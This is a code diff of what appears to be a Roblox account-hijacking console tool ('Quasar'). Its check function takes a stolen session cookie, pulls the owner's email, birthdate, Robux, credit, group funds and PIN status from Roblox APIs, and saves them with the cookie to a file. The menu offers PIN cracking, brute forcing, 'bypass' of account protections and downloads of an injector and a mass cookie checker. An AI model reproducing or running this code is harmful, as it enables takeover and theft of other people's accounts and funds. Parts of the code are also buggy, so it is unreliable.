+def download_file(url, filepath):
+    try:
+        response = requests.get(url, stream=True)
+        response.raise_for_status()
+        total_size = int(response.headers.get('content-length', 0))
+        with open(filepath, 'wb') as file, tqdm(
+            total=total_size, unit='B', unit_scale=True, desc=f"Downloading {os.path.basename(filepath)}"
+        ) as progress_bar:
+            for chunk in response.iter_content(chunk_size=8192):
+                file.write(chunk)
+                progress_bar.update(len(chunk))
+    except Exception as e:
+        print(f"Error {os.path.basename(filepath)}: {e}")
+        Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)
+
+
+
+def check(cookie):
+  check = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': cookie})
+  if check.status_code == 200:
+    Emmail = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': str(cookie)}).json()
+    email = Emmail['verified']
+    EmailName = Emmail['emailAddress']
+    Write.Print(f"[Process] Get email...\n", Colors.purple, interval=0.0025)
+    credit = requests.get("https://billing.roblox.com/v1/credit", cookies={'.ROBLOSECURITY': str(cookie)}).json()['balance']
+    Write.Print(f"[Process] Get credit...\n", Colors.purple, interval=0.0025)
+    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
+    birthday = requests.get("https://accountinformation.roblox.com/v1/birthdate", cookies={'.ROBLOSECURITY': str(cookie)}).json()
+    Write.Print(f"[Process] Get birthday...\n", Colors.purple, interval=0.0025)
+    userid = userdata['id'] #user id
+    followers = requests.get(f"https://friends.roblox.com/v1/users/{userid}/followers/count", cookies={'.ROBLOSECURITY': str(cookie)}).json()['count']
+    Write.Print(f"[Process] Get followers...\n", Colors.purple, interval=0.0025)
+    Write.Print(f"[Process] Get userId...\n", Colors.purple, interval=0.0025)
+
+    transactions = requests.get(f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=Month&transactionType=summary", cookies={'.ROBLOSECURITY': str(cookie)}, data={'timeFrame':'Month', 'transactionType': 'summary'}).json()
+    pending = transactions['pendingRobuxTotal']
+    Write.Print(f"[Process] Get Pending...\n", Colors.purple, interval=0.0025)
+    stipends = transactions['premiumStipendsTotal']
+    Write.Print(f"[Process] Get stipends...\n", Colors.purple, interval=0.0025)
+    devEx = transactions['developerExchangeTotal']
+    Write.Print(f"[Process] Get DevEX...\n", Colors.purple, interval=0.0025)
+    groups = requests.get(f"https://groups.roblox.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)})
+    groupIds = [i['group']['id'] for i in groups.json()['data'] if i['group']['owner']['userId'] == userid]
+    groupFunds = 0
+    for i in groupIds:
+        groupFunds += int(requests.get(f"https://economy.roblox.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])
+    creationDate = requests.get(f'https://users.roblox.com/v1/users/{userid}').json()['created']
+    display = userdata['displayName'] #display name
+    Write.Print(f"[Process] Get Display...\n", Colors.purple, interval=0.0025)
+    username = userdata['name'] #username
+    Write.Print(f"[Process] Get Username...\n", Colors.purple, interval=0.0025)
+    robuxdata = requests.get(f'https://economy.roblox.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
+    robux = robuxdata['robux'] 
+    Write.Print(f"[Process] Get Robux...\n", Colors.purple, interval=0.0025)
+    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
+    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
+    while rap_dict['nextPageCursor'] != None:
+        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
+    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
+    birthdate = f'{birthday["birthMonth"]}/{birthday["birthDay"]}/{birthday["birthYear"]}'
+    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
+    image_url = thumbnail["data"][0]["imageUrl"]
+    pindata = requests.get('https://auth.roblox.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
+    pin_bool = pindata["isEnabled"] 
 
     print(getBanner())
-
-    inputa =  Write.Input("[-] How many repeats: ", Colors.purple_to_blue, interval=0.0025)
-    threads = int(inputa)
-    suma = 0
-    while threads!=0:
-        groupfinder(suma)
-        threads = threads-1
-
-    Write.Input(f"Sum of the resulting groups: {suma}. Press any key to exit", Colors.orange, interval=0.0025)
+    Write.Print(f"Username: {username}, url= https://roblox.com/users/{userid}\n", Colors.purple_to_blue, interval=0.0025)
+    file = f"{username}_cookie.txt"
+    with open(file, 'a+') as f:
+            f.write(f"Username: {username} | ")
+            Write.Print(f"Display name: {display}\n", Colors.purple_to_blue, interval=0.0025)
+            Write.Print(f"User ID: {userid}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"UserID: {userid} | ")
+            Write.Print(f"Robux: {robux}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Robux: {robux} | ")
+            Write.Print(f"Has pin: {pin_bool}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Has pin: {pin_bool} | ")
+            if pin_bool == True:
+                Write.Print(f"[advice]: Use Quasar pin cracker!\n", Colors.purple, interval=0.0025)
+            Write.Print(f"Premium: {premiumbool}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Premium: {premiumbool} | ")
+            Write.Print(f"Credit: {credit}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Credit: {credit} | ")
+            Write.Print(f"Birthday: {birthdate}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"birthday: {birthdate} | ")
+            Write.Print(f"Groups: {groupIds}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Groups: {groupIds} | ")
+            Write.Print(f"Rap: {rap}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Rap: {rap} | ")
+            Write.Print(f"Is email verified: {email}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Email verified: {email} | ")
+            Write.Print(f"Email: {EmailName}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Email name: {EmailName} | ")
+            Write.Print(f"group founds: {groupFunds}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Group founds: {groupFunds} | ")
+            Write.Print(f"Dev exchange: {devEx}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"DEVx exchange: {devEx} | ")
+    with open(file, 'a+') as f:
+            f.write(f"followers: {followers} | ")
+            Write.Print(f"Pending: {pending}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Pending: {pending} | ")
+            Write.Print(f"Premium Stipends: {stipends}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Premium Stipends: {stipends} | ")
+            Write.Print(f"Followers: {followers}\n", Colors.purple_to_blue, interval=0.0025)
+    with open(file, 'a+') as f:
+            f.write(f"Display name: {display} | ")
+    with open(file, 'a+') as f:
+            f.write(f"Cookie: {cookie} | ")
+    with open(file, 'a+') as f:
+            f.write(f"Quasar cookie checker by JealLeal. Saved on: {day}.{month}.{year}")
+        #dualhook
+    os.system("pause")
     if os.name == "nt":
         os.system("cls")
     else:
         os.system("clear")
+    print('')
     print(getBanner())
     GetNumber()
+  else:
+        Write.Print(f"Followers: {followers}\n", Colors.purple_to_blue, interval=0.0025)
 
 def GetNumber():
     Printing = Colorate.Vertical(Colors.purple_to_blue, Center.XCenter("""
-[1] Cheats;                           [6] Email validator;                   [11] Get sever IP;                 
-[2] Cookie checker;                   [7] Nucker;                            [12] Follower Bot;                 
-[3] Discord fake site;                [8] BruteForcer;                       [13] Mass-cookie-check;            
-[4] Roblox Pin cracker;               [9] free-item-buyer;                   [14] Mass report;                  
-[5] Group finder                      [10] Cookie Generator;                 [15] Group wall spammer;           """), 1)  
+    [1] Cheats (Quasar)    [ONLINE];                [6] Email validator  [OFFLINE];               [11] Get server IP           [OFFLINE];                 
+    [2] Cookie checker     [ONLINE];                [7] Nucker           [ONLINE];                [12] Bypass age              [ONLINE];                 
+    [3] Immortal           [ONLINE];                [8] BruteForcer      [OFFLINE];               [13] Bypass all              [ONLINE];            
+    [4] Roblox Pin cracker [OFFLINE];               [9] free-item-buyer  [ONLINE];                [14] C# QMCC                 [ONLINE];                  
+    [5] Group finder       [ONLINE];                [10] Cookie Gen.     [OFFLINE];               [15] Group wall spammer      [OFFLINE];  """), 1)  
     print(Printing)
-    Number = Write.Input("Enter number: ", Colors.purple_to_blue, interval=0.0025)
-
-    if Number == "2":
+    Number = int(Write.Input("Enter number: ", Colors.purple_to_blue, interval=0.0025))
+    
+    if Number == 1:
         Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
-        a = 0
         time.sleep(2)
         if os.name == "nt":
             os.system("cls")
         else:
             os.system("clear")
         print('')
-        print(getChecker())
+        print(getBanner())
+        link = f"https://github.com/QuasarRBX/QuasarInjector/releases/download/2.1.4/Injector.zip"
+        
+        current_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
+        download_file(link, os.path.join(current_dir, "Injector.zip"))
+        Printing = Colorate.Vertical(Colors.red_to_yellow, Center.XCenter(f"Downloaded successfully in {current_dir}\Injector.zip. \n Unpack it and start having fun:)\n\n"), 1)  
+        print(Printing)
+        os.system("pause")
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print('')
+        print(getBanner())
+        GetNumber()
+    elif Number == 2:
+        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
+         
+        time.sleep(2)
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print('')
+        print(getBanner())
+
         cookie = Write.Input(f"Cookie to check: ", Colors.purple_to_blue, interval=0.0025)
-       
         check(cookie)
-    elif Number == "3":
-        Write.Print("Our servers off, please wait\n", Colors.purple_to_blue, interval=0.0025)
-        a = 0
+        
+    elif Number == 3:
+        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
+        time.sleep(2)
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print('')
+        print(getBanner())
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        open("https://immortal.rs/dashboard/")
         time.sleep(2)
         if os.name == "nt":
             os.system("cls")
@@ -787,15 +838,19 @@ def GetNumber():
         print('')
         print(getBanner())
         GetNumber()
-    elif Number == "4":
-        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
-        time.sleep(2)
-        Pin_Cracker()
-    elif Number == "5":
+
+    elif Number == 5:
         Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
         time.sleep(2)
         GruupFind()
-    elif Number == "7":
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print('')
+        print(getBanner())
+        GetNumber()
+    elif Number == 7:
         Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
         time.sleep(2)
         if os.name == "nt":
@@ -805,7 +860,15 @@ def GetNumber():
         print('')
         print(getBanner())
         Nucker()
-    elif Number == "9":
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print('')
+        print(getBanner())
+        GetNumber()
+         
+    elif Number == 9:
         Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
         time.sleep(2)
         if os.name == "nt":
@@ -815,7 +878,60 @@ def GetNumber():
         print('')
         print(getBanner())
         BuyAll()
-    elif Number == "10":
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print('')
+        print(getBanner())
+        GetNumber()
+         
+    elif Number == 14:
+        Write.Print("Waiting for open file...\n", Colors.purple_to_blue, interval=0.0025)
+        time.sleep(2)
+        YesNo = Write.Input("Do you want to download QuasarChecker? (y/n): ", Colors.red, interval=0.0025)
+        YesNo.lower()
+        if YesNo == "y":
+            if os.name == "nt":
+                os.system("cls")
+            else:
+                os.system("clear")
+            print('')
+            print(getBanner())
+            link = f"https://github.com/QuasarRBX/CookieChecker/releases/download/1.21/QuasarMassChecker.exe"
+            
+            current_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
+            download_file(link, os.path.join(current_dir+"\quasarmasscookiechecker", "QuasarMassChecker.exe"))
+            Printing = Colorate.Vertical(Colors.red_to_yellow, Center.XCenter(f"Downloaded successfully in {current_dir}\quasarmasscookiechecker\QuasarMassChecker.exe. \n Quick tutrial:\n\nFor our cookie checker to work correctly, you need to create a file cookies.txt in the same folder where the cookie checker is saved ({current_dir+"\quasarmasscookiechecker"}). \n\n cookies go each on a new line: cookie1\ncookie2\ncookie3\n\n\n\nCOPYRIGHT 2025 JEALLEAL (QUASAR INC)"), 1)  
+            print(Printing)
+            os.system("pause")
+            if os.name == "nt":
+                os.system("cls")
+            else:
+                os.system("clear")
+            print('')
+            print(getBanner())
+            GetNumber()
+        elif YesNo == "n":
+            Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)
+            if os.name == "nt":
+                os.system("cls")
+            else:
+                os.system("clear")
+            print('')
+            print(getBanner())
+            GetNumber()
+        else:
+            Write.Input("Invalid. Press any key", Colors.purple_to_blue, interval=0.0025) # сам ты инвалид
+            if os.name == "nt":
+                os.system("cls")
+            else:
+                os.system("clear")
+            print('')
+            print(getBanner())
+            GetNumber()
+        
+    elif Number == 12:
         Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
         time.sleep(2)
         if os.name == "nt":
@@ -824,30 +940,56 @@ def GetNumber():
             os.system("clear")
         print('')
         print(getBanner())
-        CookieGenerator()
-    elif Number == "11":
-        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
-        time.sleep(2)
+        cooke = Write.Input(f"Cookie to bypass: ", Colors.purple_to_blue, interval=0.0025)
+        Write.Print(bypass(cooke, "Age"), Colors.purple_to_blue, interval=0.0025)
         if os.name == "nt":
             os.system("cls")
         else:
             os.system("clear")
         print('')
         print(getBanner())
-        RobloxIp()
-    elif Number == "13":
+        GetNumber()
+    elif Number == 13:
         Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
+         
         time.sleep(2)
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print(getBanner())
+        cooke = Write.Input(f"Cookie to bypass: ", Colors.purple_to_blue, interval=0.0025)
+
+        Write.Print(bypass(cooke, "RemoveAll"), Colors.purple_to_blue, interval=0.0025)
         if os.name == "nt":
             os.system("cls")
         else:
             os.system("clear")
         print('')
         print(getBanner())
-        masscheck()
-    
+        GetNumber()
+
+    elif Number <=15:
+        Write.Input("This feature is disabled or was not implemented in the code. Press any key", Colors.purple_to_blue, interval=0.0025)
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print('')
+        print(getBanner())
+        GetNumber()
+
     else:
-        Write.Print("Invalid Number!\n", Colors.purple_to_blue, interval=0.0025)
+        Write.Input("Invalid number. Press any key", Colors.purple_to_blue, interval=0.0025)
+        if os.name == "nt":
+            os.system("cls")
+        else:
+            os.system("clear")
+        print('')
+        print(getBanner())
+        GetNumber()
+
+
+
 
 check_version(version)
-
